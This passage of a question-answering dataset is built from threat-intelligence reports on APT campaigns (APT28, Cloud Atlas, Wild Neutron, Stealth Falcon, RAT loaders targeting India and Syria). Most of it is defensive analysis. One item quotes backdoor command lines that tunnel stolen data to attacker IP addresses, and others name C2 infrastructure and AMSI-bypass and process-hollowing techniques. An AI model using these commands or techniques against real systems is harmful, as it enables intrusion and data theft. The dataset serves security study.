    "output": "Analyzing the malware payloads and metadata associated with the Four Element Sword Builder provides valuable insights into the malware itself, the targeting strategies, and links to past threat actor infrastructure. For instance, indicator overlap reveals connections to prior exploitation campaigns against the World Uyghur Congress (WUC) from 2009-2014, as well as overlaps with actors behind 'Operation Shrouded Crossbow.' These insights help in understanding the broader threat landscape by identifying patterns in targeting, such as the focus on the 'Five Poisons'\u2014organizations and individuals perceived as threats to Chinese government rule. This information allows cybersecurity professionals to anticipate future targets and refine their defensive measures accordingly.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What role does threat intelligence play in defending against the IXESHE campaign, and what are the key components of this defense strategy?",
    "output": "Threat intelligence plays a crucial role in defending against the IXESHE campaign by providing indicators that help identify the tools, tactics, and procedures used by the attackers. Key components of this defense strategy include enhanced visibility through endpoint, server, and network monitoring; integrity checks to detect modifications made by malware; and empowering human analysts to identify anomalous behaviors. Technologies like Deep Discovery provide real-time detection and analysis of evasive threats, enhancing the overall defense posture.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: A modular development framework suggests the group has had an organized development effort since as early as 2007.\nDuring our research, we discovered that APT28 uses a backdoor developed using a modular framework.  We call this backdoor CHOPSTICK, a somewhat ironic name that comes from our semi-random name generator. The modular design allows flexible options for compiling variants with different capabilities as needed, as well as deploying additional capabilities at runtime. This allows the developers to make targeted implants, including only the capabilities and protocols necessary for a specific environment. Such a modular framework suggests the group has had an organized development effort since as early as 2007. A formal development environment, in which code is versioned and well-organized, would almost certainly be required to track and define the various modules that can be included in the backdoor at compile time.\nCHOPSTICK variants may move messages and information using at least three methods:\n1. Communications with a C2 server using HTTP.  These protocols are covered in more detail in Appendix D.\n2. Email sent through a specified mail server. One CHOPSTICK v1 variant contained modules and functions for collecting keystroke logs, Microsoft Office documents, and PGP files. The monitoring for new files of interest is performed by a \"Directory Observer\" module. In one sample this information was intended to be sent via SMTP using a Georgian MIA mail server. It used one of four embedded sender email addresses (@mia.gov.ge) to send files via email to another email address on the same mail server. All information required for the email was hardcoded in the backdoor.\n3. Local copying to defeat closed networks. One variant of CHOPSTICK focuses on apparent air gap / closed network capabilities by routing messages between local directories, the registry and USB drives.\nBig Headline: INDICATES RUSSIAN SPEAKERS IN A RUSSIAN TIME ZONE\nDuring our research into APT28's malware, we noted two details consistent across malware samples. The first was that APT28 had consistently compiled Russian language settings into their malware. The second was that malware compile times from 2007 to 2014 corresponded to normal business hours in the UTC + 4 time zone, which includes major Russian cities such as Moscow and St. Petersburg.\nMedium Headline: Use of Russian and English Language Settings in PE Resources\nPE resources include language information that can be helpful if a developer wants to show user\ninterface items in a specific language.25 Non-default language settings packaged with PE resources are dependent on the developer's build environment. Each PE resource includes a \"locale\" identifier with a language ID \"composed of a primary language identifier indicating the language and a sublanguage identifier indicating the country/region.\"26\nAt the time of the writing of this paper, we had identified 103 malware samples that were both attributed to APT28 and contained PE resources. Table 5 shows the locale identifiers27 with associated language and country/region for these samples.\nTable 5: Locale and language identifiers associated with APT28 malware\n25Microsoft Developer Network \u2013 Multiple Language Resources http://msdn.microsoft.com/en-us/library/cc194810.aspx\n26, 27 Microsoft Developer Network \u2013 Language Identifier Constants and Strings http://msdn.microsoft.com/en-us/library/dd318693.aspx\nThe samples with Russian language settings were compiled between late 2007 and late 2013, as depicted in Figure 9.  This consistency over a long timeframe suggests that the developers of APT28 malware were using a build environment\nwith Russian language settings at least some of the time and made no effort to obscure this detail.  Overall, the locale IDs suggest that APT28 developers can operate in both Russian and English.\nFigure 9: Number of APT28 samples with Russian language settings by compile month\nMedium Headline: Compile Times Align with Working Hours in Moscow and St. Petersburg\nOf the 140 malware samples that we have attributed to APT28 so far, over 89% were compiled between 0400 and 1400 UTC time, as depicted in Figure 10.  Over 96% were compiled between Monday and Friday.  This parallels the working hours in UTC+0400 (that is, compile times begin about 8AM and end about 6PM in this time zone).  This time zone includes major Russian cities such as Moscow and St. Petersburg.\nBig Headline: CONCLUSION\nWe started researching APT28 based on activity we observed on our clients' networks, similar to other targeted threat groups we have identified over time.  We assess that APT28 is most likely sponsored by the Russian government.  We summarize our key observations about APT28 in Figure 11 below.\nAPT28's characteristics\u2014their targeting, malware, language, and working hours\u2014have led us to conclude that we are tracking a focused, longstanding espionage effort.  Given the available data, we assess that APT28's work is sponsored by the Russian government.\nFigure 11: Summary of key observations about APT28\nBig Headline: APPENDIX A: DISTINGUISHING THREAT GROUPS\nWe use the term \"threat group\" to refer to actors who work together to target and penetrate networks of interest. These individuals may share the same set of tasks, coordinate targets, and share tools and methodology. They work together to gain access to their targets and steal data.\nThe art of attributing disparate intrusion activities to the same threat group is not always simple.  Different groups may use similar intrusion methodologies and common tools, particularly those that are widely available on the Internet, such as pwdump, HTran, or Gh0st RAT. There may be overlaps between groups caused by the sharing of malware or exploits they have authored, or even the sharing of personnel. Individual threat actors may move between groups either temporarily or permanently.  A threat actor may also be a private citizen who is hired by multiple groups. Multiple groups, on occasion, compromise the same target within the same timeframe.\nDistinguishing one threat group from another is possible with enough information, analytical experience, and tools to piece it all together. We can analyze multiple incidents and tell by the evidence left behind that a given incident was the result of one threat group and not another.\nThreat actors leave behind various forensic details. They may send spear phishing emails from a specific IP address or email address. Their emails may contain certain patterns; files have specific names, MD5 hashes, timestamps, custom functions, and encryption algorithms. Their backdoors may have command and control IP addresses or domain names embedded. These are just a few examples of the myriad of forensic details that we consider when distinguishing one threat group from another.\nAt the most basic level, we say that two intrusion events are attributed to the same group when we have collected enough indicators to show beyond a reasonable doubt that the same actor or group of actors were involved. We track all of the indicators and significant linkages associated with identified threat groups in a proprietary database that comprises millions of nodes and linkages between them.  In this way, we can always go back and answer \"why\" we associated cyber threat activity with a particular group.\n\nWhy does the use of a modular development framework by APT28 suggest an organized and longstanding development effort?",
    "output": "The use of a modular development framework by APT28 suggests an organized and longstanding development effort because it allows for flexible options in compiling variants with different capabilities as needed. This modularity enables the deployment of additional capabilities at runtime, allowing developers to create targeted implants that include only the necessary features for a specific environment. Such a framework requires a formal development environment where code is versioned and well-organized, which is essential for tracking and defining the various modules that can be included in the backdoor at compile time. This level of organization and sophistication indicates a structured and ongoing development process.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: A CUNNING MENAGERIE IN THE WILD\nIn order to delve into specific examples, we require two distinct allowances from the reader:\n\u2022 The first regards the use of attribution examples. As should have become apparent by now, attribution claims are far from certain and often sparsely substantiated. As part of a company and a research team that is cautious to remain attribution agnostic, we toe this line respectfully and with good reason. In the process of discussing in-the-wild examples of manipulation of attribution leads, it may be necessary to point to commonly held beliefs or rumours as to the provenance of certain threat actors in order to showcase where the indicators falter. We ask the reader to treat these as what they are: rumours heard through the attribution grapevine, the sort of RUMINT that associates a threat actor with a country, region, or organization. These are not our own assertions or claims. We remain steadfast in our conviction of the complexities of the attribution problem and would prefer not to be quoted by overzealous readers as asserting attribution claims that are not our own. At times our own research may support these intuitions but we do not go so far as to make these attribution claims our own.\n\u2022 Secondly, despite the liberties provided by an academically toned industry publication, we remain bound by corporate realities, respect for the research methods of collaborators, and, most of all, legal constraints. As such, we may not always be able to provide full disclosure of indicators involved in certain findings. As we do not seek to recreate the process of each investigation, we feel these are not vital to convey the main thrust of our argument, which is that intermediate-to-advanced threat actors are aware of attribution methods and are already attempting to manipulate researchers to expend limited resources chasing ghost leads. Where gaps arise, let us relegate these accounts to camp fire re-tellings among friends.\nWe thank the reader for these allowances, providing a lacuna between authors and content, in order to further a wider discussion about the complexities of attribution that could not happen otherwise.\nMedium Headline: On language \u2013 Cloud Atlas\nIn December 2014, Blue Coat exposed a newly discovered malware framework dubbed 'Inception' [4, 5], which was later attributed to a new actor named 'Cloud Atlas' [6]. Cloud Atlas is believed to have been born from a previous actor tracked as 'Red October' [7]. Whether Cloud Atlas is the same actor or a spin-off of the original, this case posed some interesting analytical problems when it came to attribution. The current belief is that both teams are likely Eastern European-based and most likely Russian-speaking. Cloud Atlas may be a spin-off from the original group following conflicts arising from the annexation of Crimea in the spring of 2014.\nDuring the investigation of this new campaign, various oddities were discovered that seemed to disprove the belief that Cloud Atlas was Eastern European. It was only after analysing these breadcrumbs in conjunction with each other that the determination was made that Cloud Atlas was most likely 'muddying the water' in order to make attribution more diffi cult. Targeting seemed to fit the original campaign, as the majority of attacks were heavily focused on Russia, specifi cally government and diplomatic entities. Very similar, if not identical lure documents were used in the two campaigns. Also, the implementation of compression algorithms was nearly identical in both, with the Cloud Atlas version showing slight improvement. But this is where the similarities stop, and the weirdness starts:\nOne of the early lure documents discovered in this campaign pertained to Russian government officials but was titled in Spanish. Further analysis of metadata from the original lure document showed it was created on a native Spanish speaker's system. Initially, this caused a bit of confusion, but it was later determined that the lure document was most likely stolen from an advisor in the Spanish Embassy in Moscow and repurposed for use in attacks.\nThe infrastructure used by Cloud Atlas to manage victim data and implants was also interesting. The actors used a large pool of IP addresses in a 'round robin' fashion to access the cloud-based provider used to host payloads and store exfi ltrated data. Geolocation of the IP addresses showed the actors as mainly originating from South Korea. Later analysis revealed that these IP addresses were mostly compromised home routers which contained a small proxy implant.\nFocusing on language clues left behind in the malware caused further attribution issues, as conflicting indicators were peppered into the mobile implants:\n\u2022 Arabic strings in the BlackBerry version\n\u2022 Hindi characters in the Android version\n\u2022 God_Save_The_Queen was found in the BlackBerry version\n\u2022 'JohnClerk' was found in the project path for the iOS version\nThe presence of these various conflicting strings in different versions of the malware could either mean that the actors borrowed code from various sources to use in their implants, or that the strings were purposely placed to misguide researchers.\nDuring the investigation, many researchers were running the various samples found in the wild in an effort to solicit a second-stage binary from the actors. In multiple instances, an implant was served up to researcher machines that did not fi t the typical Cloud Atlas framework. This implant showed characteristics of malware traditionally considered Chinese and used a command-and-control domain that was inactive at the time. The belief is that the actors recognized researcher systems in their logs and instead of serving the normal second-stage binary, they instead provided a 'fake', unrelated piece of malware to cause confusion.\nBlue Coat researchers did an excellent job in their original paper describing the various paths attempted for attribution, only to hit a dead end or to find nonsense data. This is a great example of\nhow certain APT actors are aware of the indicators we as researchers tend to latch onto, and are already purposely modifying those characteristics.\nMedium Headline: On tasking \u2013 Wild Neutron\nWild Neutron3 is a crowd favourite when it comes to complicated attribution research, complete with apocryphal tales and red herrings. Wild Neutron first rose to prominence in 2013 [8], though evidence shows the group was active as early as 2011. Their reputation is in large part thanks to their ambitious targeting, bagging whales like Apple, Facebook, Microsoft and Twitter. Their arsenal included multi-platform malware [9], a Java zero-day (CVE20130422), and a penchant for well-chosen watering-hole sites. After close to a year of silence, Wild Neutron returned for a 2015 campaign, this time with a stolen digital certificate and a still undiscovered Flash zero-day exploit. Throughout, attribution has been a maze of contradictory indications and false starts that continue to elude researchers.\nSome of the simpler misleads are found in the Windows malware where language strings were found both in Romanian ('la revedere' meaning 'goodbye') and Russian ('uspeshno', a transliteration of 'successfully'). Other leads include a false connection to a well known researcher, connections to apparent scam artists, investment funds, and even a seemingly successful cryptocurrency scam4. But Wild Neutron presents a deeper challenge for analysts than this particular hodgepodge of indicators, one that speaks to the possible nature of the threat actor as a mercenary entity. Usually a situation so convoluted would find some semblance of resolution by looking at the victim spread, the sort of organizations and entities targeted by the threat actor. In this case, the victim spread does little to assuage our uncertainty.\nLooking at Wild Neutron's targeting, no one clear nexus of interest is apparent:\n\u2022 Large company groups involved in M&A\n\u2022 Real estate companies\n\u2022 Bitcoin-related companies\n\u2022 Investment fi rms\n\u2022 IT companies\n\u2022 Healthcare companies\n\u2022 Law fi rms\n\u2022 Developers (iOS and Linux)\nWith victims in over 11 countries5 and multiple verticals, we can perhaps assume several different and possibly overlapping nexuses of interest that may suggest multiple tasking entities or diverging mission imperatives. Another noteworthy observation\nis the lack of victims in diplomatic or government institutions, a customary vertical for a threat actor of this calibre. This stands in juxtaposition to what is presumably counterterrorism tasking with the compromise of the Ansar alMujahideen forum. Researchers concluded that the tasking was in line with a mercenary arrangement, taking tasking from different entities and imperatives, including a financial incentive to pilfer tradeable financial information on mergers and acquisitions. This type of threat actor, while unlikely to remain rare, by its very nature dismantles our ability to form a generalized attributory claim on the basis of tasking alone.\n3 Also known as: Morpho, Butterfly, ZeroWing, or Jripbot.\n4 These attributory hypotheses and the supporting indicators are presented in the Kaspersky Private Intel Report on Wild Neutron pushed to subscribers in July 2015.\n5 Visibility courtesy of the Kaspersky Security Network (KSN) and Kaspersky sinkholes of Wild Neutron command-and-control infrastructure.\n\nBased on the above text, answer a question. How did the Cloud Atlas threat actor attempt to mislead researchers regarding their true origin?",
    "output": "The Cloud Atlas threat actor employed several tactics to mislead researchers about their origin. They used lure documents in Spanish, which were actually stolen from an advisor in the Spanish Embassy in Moscow. Additionally, they utilized a pool of compromised home routers primarily located in South Korea to manage their infrastructure. Furthermore, they included conflicting language strings in their malware, such as Arabic, Hindi, and English phrases, to create confusion. Lastly, they served fake, unrelated malware to researcher machines to throw off investigations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ATTACK 1: A HELPING OF MALWARE WITH THAT PROXY?\nIn this attack, which we first observed in the second week of June, the potential victim is encouraged to visit a download link containing a malicious installer of Freegate.\nFreegate is a standalone circumvention-bypassing Virtual Private Network (VPN) client for Windows. Legitimate versions of the Freegate software are available for download on its . While initially developed for mainland Chinese users, the software is used in a number of other countries.\nWhile Freegate was by one anti-virus company nearly a decade ago, in this attack, attackers packaged what appears to be a legitimate version of Freegate with a malicious implant.2 The targeted group were members of the Syrian opposition in a private social media group.\nhttp://www.mediafire.com/download/[REDACTED]/VPN-Pro.zip\nWhen a potential victim visits the link, they are offered the download of a file which MediaFire lists as uploaded on June 15, 2013.\n3\nVPN-PRO.zip\nUploaded: 2013-06-15 16:54:31\nThe zip file extracts to a MS Windows executable file.\nVPN-Pro.exe4\nThe binary was compiled at 2013-06-15 22:41:31 UTC and has the following properties:\nLegalCopyright: Copyright \u00a9 2013\nAssembly Version: 1.0.0.0\nInternalName: VPN-Pro.exe\nFileVersion: 1.0.0.0\nProductName: VPN-Pro\nProductVersion: 1.0.0.0\nFileDescription: VPN-Pro\nOriginalFilename: VPN-Pro.exe\nSimilar to , this was written in .NET and appears to require the .NET 3.5 framework to execute.5\nWhen VPN-Pro.exe is run, the victim is shown the Freegate end-user license agreement (EULA) dialogue box.6 Upon agreeing to the EULA, an operational copy of Freegate proxy is launched, which includes a request to unblock the firewall. The copy of Freegate launched is listed as \"Freegate 7.35 Professional Edition.\" The Freegate software begins operating, and quickly prompts the user for an update.\nMedium Headline: Infection\nIn addition to running a legitimate copy of Freegate 7.35,7 the malware installs an implant.\nA fake \"svchost.exe\" is installed in the victim's Application Data directory.\nC:\\Documents and Settings\\<Username>\\Application Data\\svchost.exe\nDropped files on execution of VPN-Pro.exe:\nExamination of the \"svchost.exe\" binary shows multiple references to \"ShadowTech Rat.\"\nExamination of network traffic also identifies the implant as ShadowTech RAT.\nPacket capture on port 1321/tcp:\nShadowTech Rat is a Remote Access Trojan which appears to be widely available for download on both English and Arabic language sites. Videos can be found on demonstrating its functionality. The tool offers a range of options to the attacker, from keylogging and remote activation of the webcam to file exfiltration.\nShadowTech RAT control console:\nBoth VPN-Pro.exe and svhost.exe have been submitted to VirusTotal:\nBoth have relatively low detection rates by anti-virus software. As of June 20, 2013, svchost.exe was only detected by four out of 47 tested anti-virus programs, while VPN-Pro.exe was only detected by five out of 46.\nThe svchost.exe initiates an outbound connection to a command and control (C2) server hosted at thejoe.publicvm.com. This domain resolves to an address inside Syrian IP space: 31.9.48.119.\ninetnum: netname:\n31.9.0.0 - 31.9.127.255\nSY-ISP-TARASSUL\ndescr:\ncountry:\nTarassul inetnet Service Provider\nSY\nThis is not the first time that malicious installer packages have been created for circumvention tools. In 2012, malicious installers for Green Simurgh\u2014a standalone proxy intended for Iranian users but also used by some Syrians\u2014were . The creators of Green Simurgh responded by posting a prominent warning on their highlighting the presence of these malicious installers. Last year, malware which purported to be the Tor Browser Bundle was . It was found to be backdoored by Gh0st RAT and exfiltrated data to an IP in China.\nAn attack using a malicious installer of a working and reputable security or proxy tool is especially pernicious as it targets users who likely recognize the importance of privacy and circumvention, and may believe that they have increased their privacy and security by installing the tool.\n\nWhat are the key characteristics of the ShadowTech RAT used in the 'A Call to Harm' APT campaign, and how does its low detection rate by antivirus software impact the effectiveness of traditional security measures?",
    "output": "The ShadowTech RAT used in the 'A Call to Harm' APT campaign is a Remote Access Trojan that is widely available for download on both English and Arabic language sites. It offers a range of functionalities to the attacker, including keylogging, remote activation of the webcam, and file exfiltration. The low detection rate of both the VPN-Pro.exe and svchost.exe files by antivirus software significantly impacts the effectiveness of traditional security measures. As of June 20, 2013, svchost.exe was only detected by four out of 47 tested antivirus programs, while VPN-Pro.exe was detected by only five out of 46. This low detection rate allows the malware to evade most antivirus solutions, making it difficult for victims to realize they have been compromised until significant damage has been done.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: What's new?\nCisco Talos recently discovered a malicious campaign targeting government employees and military personnel in the Indian sub-continent with two commercial and commodity RAT families known as (<https://malpedia.caad.fkie.fraunhofer.de/details/win.netwire>)NetwireRAT (aka NetwireRC) and (<https://malpedia.caad.fkie.fraunhofer.de/details/win.ave_maria>)WarzoneRAT (aka Ave Maria). The attackers delivered a variety of lures to their targets, predominantly posing as guides related to Indian governmental infrastructure and operations\nsuch as Kavach and I.T.-related guides in the form of malicious Microsoft Office documents (maldocs) and archives (RARs, ZIPs) containing loaders for the RATs.\nApart from artifacts involved in the infection chains, we've also discovered the use of server-side scripts to carry out operational tasks such as sending out malicious emails and maintaining presence on compromised sites via web shells. This provides additional insight into the attacker's operational TTPs.\nSome of these lures and tactics utilized by the attackers bear a strong resemblance to the (<https://blog.talosintelligence.com/2021/05/transparent-tribe-infra-and-targeting.html>)Transparent Tribe and (<https://blog.talosintelligence.com/2021/07/sidecopy.html>)SideCopy APT groups, including the use of compromised websites and fake domains.\nBig Headline: How did it work?\nThis campaign uses a few distinct, yet simple, infection chains. Most infections use a maldoc that downloads and instruments a loader. The loader is responsible for downloading or decrypting (if embedded) the final RAT payload and deploying it on the infected endpoint. In some cases, we've observed the use of malicious archives containing a combination of maldocs, loaders and decoy images. The RAT payloads are relatively unmodified, with the command and control (C2) IPs and domains being the most pivotal configuration information.\nBig Headline: Infection chains\nThe earliest instance of this campaign was observed in December 2020 utilizing malicious Microsoft Office documents (maldocs). These maldocs contain malicious VBA macros that download and execute the next stage of the infection \u2014 the malware loader.\nThe maldocs' content ranges from security advisories, to meeting schedules, to software installation notes. These maldocs contain malicious macros that download and execute the next stage payload on the victim's endpoint. The final payload is usually a RAT that can perform a multitude of malicious operations on the infected endpoint.\nThe maldocs pose as documents related to either meeting schedules pertinent to the victims, or as technical guides related to the Government of India's IT infrastructure. It is likely that these files are either delivered as attachments or links in spear-phishing emails where the verbiage is meant to social engineer the victims into opening the maldoc attachments or downloading them from an attacker-controlled link.\nSome file names used are:\nKAVACH-INSTALLATION-VER-1.docm\nSecurity-Updates.docm\nOnline meeting schedule for OPS.doc\nschedule2021.docm\nInterestingly, we've observed the use of Kavach-themed maldocs and binaries being used in recent SideCopy attacks.\nMalicious macro in maldoc downloading and executing the next stage payload.\nMedium Headline: Stage 2 \u2014 Loaders\nThe payload is usually loader binaries aimed at instrumenting the final malware payload. These loaders will use either of the following techniques to instrument the final malware payloads on the endpoint:\nDownload payload from remote location and activate using process hollowing into itself or a target process.\nDecode embedded payload and activate using process hollowing.\nDepending on the variants, the loaders may also perform the following peripheral activities:\nDisable AMSI scanning by patching the first six bytes of the \"AmsiScanBuffer\" API.\nSet up persistence via registry for the next stage malware payload dropped to disk using the HKCU\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run keys.\nSmall Headline: Downloaders\nThroughout March and April 2021, the attackers utilized downloaders to download and execute the RAT payloads from remote locations. The earliest versions of this loader used RunPE DLLs to inject the malware payloads into a specified target process via hollowing.\n.NET loader utilizing RunPE.dll to inject AveMaria RAT payload into InstallUtil.exe.\nIn May 2021, the attackers used the next iteration of their C#-based downloader that reaches out to a decoy URL and only proceeds with execution if the communication process fails.\nDownloader reaching out to a decoy URL and executing actual functionality in the catch code block.\nThis downloader then proceeds to patch the \"AmsiScanBuffer\" API, establishes persistence for the next stage payload and invokes it at the end. The payload in the next stage consists of legitimate .NET-based applications trojanized with the ability to decrypt and deploy the NetwireRAT malware.\nAMSI bypass, persistence and invocation by the loader.\nToward the beginning of June 2021, the attackers started experimenting with the use of Pastebin as a payload-hosting platform. The downloader reached out to a Pastebin URL via cURL to download and inject the payload into its own running process.\nEvolution of the downloaders:\nSmall Headline: Loaders with embedded payloads\nThe attackers modified open-source projects with code to load trojanized .NET-based binaries as loaders for the RATs dating as far back as December 2020. One of the droppers we analyzed is based on the Pangantucan Community High School (<https://github.com/bwjctan1999/PCHS-Library-Manager>)library management system application.\nIt is likely that the loader is based on a crypter available to the attackers since we've observed other crimeware families such as (<https://malpedia.caad.fkie.fraunhofer.de/details/win.formbook>)Formbook use similar loaders to infect their targets.\nThe original application Initialization code for Form1.\nThe same function in the trojanized version calls a constructor to the added ISectionEntry class.\nThe loader modified the Login form with a call to a function that loads a DLL loader with the assembly name \"SimpleUI.\" The second-stage loader is extracted from the .NET resource with the name \"Draw.\"\nThe assembly extracted from the Draw resource is responsible for decoding and loading a Netwire injector module which is stored as the AuthorizationRule bitmap resource in the original trojanized loader.\nAutorizationRule blob parsed as a bitmap image (464,147 bytes long).\nThe injector is responsible for deploying the netwireRAT binary present in its .NET resources into a target process, such as vbc.exe.\nMedium Headline: Maldoc infection chain variation\nIn one instance, the attackers used a different variation of the infection chain that starts with a malicious document delivered to the victim. The macro in the maldoc downloads and executes a VBScript (VBS) instead of directly downloading the malware payload.\nThe VBS contains many junk comments interlaced with the actual malicious code. The malicious code will execute an encoded PowerShell command to download the next payload.\nThe PowerShell downloads a malicious archive and an unzip utility such as 7-Zip from a remote location. This utility unzips and runs the malware payload from the archive file. An example of the command used to unzip the archive is:\n7za.exe x -y -aoa -bso0 -bse0 -bb0 -bd <archive_file_path>\nDecoded PowerShell commands to activate the next-stage payload.\nInfection chain diagram:\nThe final payload in this infection chain is a loader for AveMariaRAT.\nMedium Headline: Archive-based infections\nIn other infection attempts dating as far back as December 2020, the attackers hosted malicious ZIP archives containing malware payloads on compromised websites. It is likely that the URLs to these archive files were sent to victims to make them download and open the malware payload on their endpoints.\nThree distinct archives containing the malicious payloads.\nThe malicious binaries from the archives found thus far load and instrument NetwireRAT.\n\nHow does the infection chain of the Operation Armor Piercer campaign typically work, and what are the key components involved in delivering the final RAT payload?",
    "output": "The infection chain of the Operation Armor Piercer campaign typically begins with a malicious Microsoft Office document (maldoc) that contains malicious VBA macros. These macros download and execute the next stage of the infection, which is a loader. The loader is responsible for downloading or decrypting the final RAT payload (either NetwireRAT or WarzoneRAT) and deploying it on the infected endpoint. Some variations involve the use of malicious archives containing a combination of maldocs, loaders, and decoy images. The final payload is usually a RAT that can perform various malicious operations on the infected endpoint.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 5. Stealth Falcon's Widespread Targeting of UAE Figures\nThis section describes how we identified additional Stealth Falcon victims and bait content, and traced Stealth Falcon's spyware to additional C2 servers.\nGiven Stealh Falcon's use of public Twitter mentions to contact individuals, we searched Google and Twitter for instances of aax.me links. The links we found indicated that we could easily probe aax.me to get a comprehensive list of all currently active short URLs, and their corresponding long URLs. Our findings point to a UAE-focused operator, whose bait content and targets are linked to the Emirates. Furthermore, we were able to connect this attack to case from December 2012, where an anonymous UAE activist contacted us and claimed to have received a suspicious link from a Twitter account that was purportedly under government control.\nMedium Headline: 5.1. Public Targets and Links to Arrests\nThis section describes 24 Stealth Falcon Twitter targets we identified on the basis of them receiving an aax.me link in a Twitter mention.\nWe found aax.me links targeting 24 accounts, each of whom was mentioned in a tweet that also contained an aax.me shortened link. We were unable to get details about 17 of the accounts. Of the accounts we have been able to identify, several individuals were subsequently arrested or convicted in absentia by the UAE Government in relation to their online activities.\nThe following table outlines these cases, and notes arrests. For completeness, the table includes the cases from Section 4.14.3:\nWe list additional details in Appendix D: Public Stealth Falcon Tweets.\nMedium Headline: 5.2. Ennumerating aax.me for Bait Content\nThis section describes how we probed every conceivable short URL on aax.me, and found 402 pieces of bait content that we believe were sent by Stealth Falcon.\nAll of the public aax.me links we found, as well as the links sent to Donaghy, matched the regular expression /aax\\.me\\/[0-9af]{5}/. Assuming all links shortened via aax.me match this regular expression, there are only 165 (1,048,576) possible short URLs. We sent a request to aax.me for each possible URL, and observed the returned page or redirect. We found 57 URLs that exhibited the redirect.php profiling behavior, and 524 URLs that returned an HTTP 302 redirect to an expanded URL. The other 1,047,995 aax.me links returned a HTTP 302 redirect to the aax.me homepage; we assume these short URLs were unassigned to an expanded URL, as of the time of our scan.\nWe coded the long URLs where the URLs were still active, or where we could find an archived copy of, or some information about, the URL. We were able to code 535 URLs, and failed to code 46 URLs as the corresponding websites were down, and we could not find reliable information about what content the URLs contained. See Appendix E: Results of aax.me Scan for details. We coded 133 URLs as \"advertisement\" (25% of all coded URLs), as they appeared to represent an advertisement for a product. The vast majority of these advertisements seemed to be products typically marketed via spam (e.g., \"dietary supplement\" or \"green coffee\"). We suspect that these links may have been shortened by spammers, as the aax.me URL shortening page is pubilcly accessible and indexed by Google, and YOURLS advises that publicly accessible URL shorteners will receive spam. 83 All \"advertisement\" links were 302 redirects, and none were redirect.php links. This is consistent with our observation that the aax.me public interface only permits visitors to shorten links using the 302 redirect method.\nWe filtered out the short URLs classified as \"advertisement.\" There were 402 non-advertisement short URLs that we tagged. We display a summary of the top ten tags below:\nWe noted that a number of long URLs had multiple corresponding short URLs. We display the top ten long URLs below.\n\nBased on the above text, answer a question. How did the researchers identify additional Stealth Falcon victims and trace their spyware to additional C2 servers? Explain the methodology and its significance in uncovering the extent of the operation.",
    "output": "The researchers identified additional Stealth Falcon victims and traced their spyware to additional C2 servers by leveraging the group's use of public Twitter mentions to contact individuals. They searched Google and Twitter for instances of aax.me links, which are shortened URLs used by Stealth Falcon. By probing aax.me, they obtained a comprehensive list of all currently active short URLs and their corresponding long URLs. This methodology allowed them to uncover a UAE-focused operator whose bait content and targets were linked to the Emirates. The significance of this approach lies in its ability to reveal the widespread nature of the operation and its connection to a case from December 2012, where an anonymous UAE activist reported receiving a suspicious link from a Twitter account allegedly under government control.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: This post was authored by (<https://linkedin.com/in/christophermarczewski>)Christopher Marczewski with contributions from (<http://blogs.cisco.com/author/CraigWilliams>)Craig WIlliams\nA new piece of wiper malware has received quite a bit of media attention. Despite all the recent press, Cisco's Talos team has historic examples of this type of malware going back to the 1990s. Data is the new target, this should not surprise anyone. Recent examples of malware effectively \"destroying\" data --putting it out of victims' reach \u2013 also include Cryptowall, and Cryptolocker, common ransomware variants delivered by exploit kits and other means.\nWiping systems is also an effective way to cover up malicious activity and make incident response more difficult, such as in the case of the (<http://blogs.cisco.com/security/thoughts-on-darkseoul-data-sharing-and-targeted-attackers>)DarkSeoul malware in 2013.\nAny company that introduced proper back-up plans in response to recent ransomware like Cryptolocker or Cryptowall should already be protected to a degree against these threats. Mitigation strategies like defense in depth will also help minimize the chance of this malware reaching end systems.\nQ: How does the DarkSeoul malware utilize wiping systems to cover up its malicious activities, and what mitigation strategies can companies employ to protect against such threats?",
    "output": "The DarkSeoul malware utilizes wiping systems to cover up its malicious activities by effectively destroying data, making it unreachable for victims and complicating incident response efforts. This method ensures that evidence of the attack is minimized, making it harder for investigators to trace the source and understand the extent of the breach. To protect against such threats, companies can implement several mitigation strategies. Firstly, introducing proper backup plans can ensure that critical data is not lost even if systems are wiped. Additionally, adopting a defense-in-depth strategy can minimize the chances of malware reaching end systems. Defense-in-depth involves layering multiple security measures, such as firewalls, intrusion detection systems, and regular software updates, to create a robust defense mechanism against various types of cyber threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: SSH tunnel backdoor\nDuring the 2014/2015 attacks, we observed the attackers deploying custom, OpenSSH-based Win32 tunnel backdoors that are used to exfiltrate large amounts of data in a reliable manner. These tunnel backdoors are written as \"updt.dat\" and executed with two parameters, -z and -p. These specify the IP to connect to and the port. Despite the port number 443, the connection is SSH:\n/d /u /c updt.dat -z 185.10.58.181 -p 443\n/d /u /c updt.dat -z 46.183.217.132 -p 443\n/d /u /c updt.dat -z 217.23.6.13 -p 443\nFor authentication, the SSH tunnel backdoor contains a hardcoded RSA private key.\nBig Headline: Victims and statistics\nThe Wild Neutron attacks appear to have a highly targeted nature. During our investigation, we have been able to identify several victims across 11 countries and territories:\nFrance\nRussia\nSwitzerland\nGermany\nAustria\nPalestine\nSlovenia\nKazakhstan\nUAE\nAlgeria\nUnited States\nThe victims for the 2014-2015 versions are generally IT and real estate/investment companies and in both cases, a small number of computers have been infected throughout the organizations. The attackers appear to have updated the malware implant and deployed some additional tools, however, we haven't observed serious lateral movement in these cases.\nBig Headline: Attribution\nThe targeting of various companies, without a government focus, makes us believe this is not a nation state sponsored APT. The attackers have also shown an interest in investment related targets, which indicate knowledge and skills to exploit such information on the market to turn it into financial advantages.\nIn some of the samples, the encrypted configuration includes a Romanian language string #WildNeutron\nIn some of the samples, the encrypted configuration includes a Romanian language string, which is used to mark the end of the C&C communication:\nInterestingly, \"La revedere\" means \"goodbye\" in Romanian. In addition to that, we found another non-English string which is the latin transcription of the russian word \u0423\u0441\u043f\u0435\u0448\u043d\u043e 